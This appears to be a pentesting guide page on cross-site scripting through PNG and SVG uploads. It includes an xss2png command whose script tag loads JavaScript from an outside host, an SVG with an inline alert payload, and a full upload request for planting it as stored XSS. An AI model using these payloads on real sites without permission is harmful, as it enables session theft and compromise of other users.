# Cross-Site Scripting (XSS)

### XSS PNG

```
python3 xss2png.py -p "<SCRIPT SRC=//XSS.VAVKAMIL.CZ></SCRIPT>" -o xss.png
```

{% embed url="https://github.com/vavkamil/xss2png" %}

### XSS SVG

Scalable Vector Graphics(SVG) is an XML-based vector image format for two-dimensional graphics with support for interactivity and animation.

The below code is an example of a basic SVG file that will show a picture of a rectangle:

```
<svg width="400" height="110">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
```

SVG files also support inline javascript code. For instance a developer might use javascript in an svg image so they can manipulate it in real time. This can be used for animation and other tasks.

Another thing to note is that SVG files can be treated as images in HTML. This means you can place a SVG file in a image tag and it will render perfectly:

```
<img src="rectangle.svg" alt="Rectangle" height="42" width="42">
```

#### XSS

If a website loads a SVG file with an XSS payload it will get executed. This is often over looked by developers and attackers alike. An example SVG file with an alert XSS payload can be found below:

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("Ghostlulz XSS");
   </script>
</svg>
```

One easy way to test for this vulnerability is to upload a SVG file as your profile picture as shown in the below burp requests:

```
POST /profile/upload HTTP/1.1
Host: XXXXXXXXX.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer XXXXXXXXXXXXXXXXXX
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
Connection: close
Referer: https://XXXXXXXXX
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("Ghostlulz XSS");
   </script>
</svg>
-----------------------------232181429808--
```

Notice the content type is set to :

```
Content-Type: image/svg+xml
```

Once the image is uploaded you just need to find out what path it was uploaded to. This can easily be done by right clicking the image and selecting “copy image address” , if your using google chrome. If everything worked when you view the image your payload will execute. You just got stored XSS via a SVG file.

![](https://secureservercdn.net/198.71.233.229/1j8.930.myftpupload.com/wp-content/uploads/2019/10/Screen-Shot-2019-10-05-at-12.04.32-PM-1024x493.png)
